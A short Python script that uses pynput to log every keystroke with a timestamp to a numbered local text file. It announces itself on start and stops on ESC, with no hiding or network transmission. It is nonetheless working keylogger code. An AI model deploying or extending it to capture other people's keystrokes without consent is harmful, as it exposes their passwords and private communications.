from pynput import keyboard
import os
from datetime import datetime

number = 1

while os.path.exists("keylog" + str(number) + ".txt"):
    number = number + 1

file = open("keylog" + str(number) + ".txt", "a")

def key_pressed(key):
    time = datetime.now().strftime("%H:%M:%S")
    file.write(time + " - " + str(key) + "\n")
    file.flush()

def key_released(key):
    if key == keyboard.Key.esc:
        file.close()
        return False

print("Keylogger started...")
print("Press ESC to stop.")

listener = keyboard.Listener(
    on_press=key_pressed,
    on_release=key_released
)

listener.start()
listener.join()